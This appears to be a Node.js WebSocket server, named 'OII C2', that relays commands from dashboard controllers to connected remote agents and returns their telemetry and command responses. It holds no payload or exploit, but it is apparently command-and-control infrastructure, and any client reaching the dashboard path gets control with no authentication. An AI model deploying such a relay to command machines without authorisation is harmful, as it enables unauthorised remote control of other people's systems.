// FILE: server.js
const express = require('express');
const { WebSocketServer } = require('ws');
const uuid = require('uuid');

const PORT = process.env.PORT || 3000;
const app = express();

// Health Check endpoint for Render
app.get('/', (req, res) => res.send('OII C2 Operational'));

const server = app.listen(PORT, () => console.log(`C2 Listening on ${PORT}`));
const wss = new WebSocketServer({ server });

const agents = new Map(); // Store agents: { id: "...", socket: ws, data: {...} }
const controllers = new Set(); // Store OII Dashboards

wss.on('connection', (ws, req) => {
  // Determine if connection is Controller (Dashboard) or Agent
  const isController = req.url.includes('dashboard');
  
  if (isController) {
    console.log('Controller connected');
    controllers.add(ws);
    
    // Send current list of agents immediately
    const agentList = Array.from(agents.values()).map(a => a.data);
    ws.send(JSON.stringify({ type: 'FULL_SYNC', payload: agentList }));
    
    ws.on('message', (msg) => {
      try {
        const data = JSON.parse(msg);
        console.log('Command received from Controller:', data);
        
        // Forward command to specific agent
        if (data.action && data.agent_id && agents.has(data.agent_id)) {
          const agentWs = agents.get(data.agent_id).socket;
          agentWs.send(JSON.stringify(data));
        } else {
          console.warn(`Agent ${data.agent_id} not found or offline.`);
        }
      } catch (e) {
        console.error('Error parsing controller message:', e);
      }
    });
    
    ws.on('close', () => controllers.delete(ws));
  } 
  else {
    // It's an Agent
    const agentId = req.headers['agent-id'] || `unknown-${uuid.v4().substring(0,4)}`;
    const agentIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const initialData = { 
      id: agentId, 
      ip: agentIp, 
      status: 'IDLE',
      cpuUsage: 0,
      ramUsage: 0,
      latency: 0,
      lastHeartbeat: new Date() 
    };
    
    agents.set(agentId, { socket: ws, data: initialData });
    console.log(`Agent connected: ${agentId}`);
    
    // Broadcast connection to controllers
    broadcast({ type: 'AGENT_CONNECTED', payload: initialData });

    ws.on('message', (msg) => {
      try {
        const message = JSON.parse(msg);
        
        // If it's telemetry/heartbeat
        if (message.type === 'HEARTBEAT') {
           const agentRecord = agents.get(agentId);
           if (agentRecord) {
             agentRecord.data = { ...agentRecord.data, ...message.payload, lastHeartbeat: new Date() };
             // Broadcast update to dashboards
             broadcast({ type: 'TELEMETRY', payload: agentRecord.data });
           }
        }
        // If it's a command response
        else if (message.type === 'RESPONSE') {
           broadcast({ type: 'CMD_RESPONSE', payload: message });
        }
      } catch (e) {
        console.error('Error processing agent message:', e);
      }
    });

    ws.on('close', () => {
      console.log(`Agent disconnected: ${agentId}`);
      agents.delete(agentId);
      broadcast({ type: 'AGENT_DISCONNECTED', payload: { id: agentId } });
    });
  }
});

function broadcast(msg) {
  controllers.forEach(c => {
    if (c.readyState === 1) c.send(JSON.stringify(msg));
  });
}
